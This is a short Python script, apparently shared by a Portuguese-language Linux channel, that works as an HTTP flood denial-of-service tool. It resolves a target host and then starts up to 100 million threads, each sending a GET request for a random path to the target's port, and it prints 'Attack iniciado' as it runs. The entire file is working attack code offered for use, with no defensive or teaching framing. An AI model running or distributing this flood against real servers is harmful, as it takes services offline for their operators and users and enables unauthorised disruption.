# -*- coding: utf-8 -*-
# Author : Cozmo
# Canal : Cozmo-Linux
# Necessario python2 ou python3
# todos copyrights de Web-Ninjas

import random
import socket
import string
import sys
import threading
import time

# ETC
host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print ("ERROR\n Usage: " + sys.argv[0] + " < Host > < Porta > < pacotes >")
    sys.exit(1)

# Converter FQDN para IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Coloque a website correta!")
    sys.exit(2)

# Criar ameaças
thread_num = 0
thread_num_mutex = threading.Lock()


# Print ameaças status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print ("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] !!PacketsFlood!!")

    thread_num_mutex.release()


# Generar URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform do request
def attack():
    print_status()
    url_path = generate_url_path()

    # Criar raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # socket infos
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        #dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
        byt = msg.encode()
        dos.send(byt)
    except socket.error:
        print ("\n [ Conecçao perdida com servidor ]: " + str(socket.error))
    finally:
        # Fechar a socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print ("[#] Attack iniciado!! " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))

# Spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads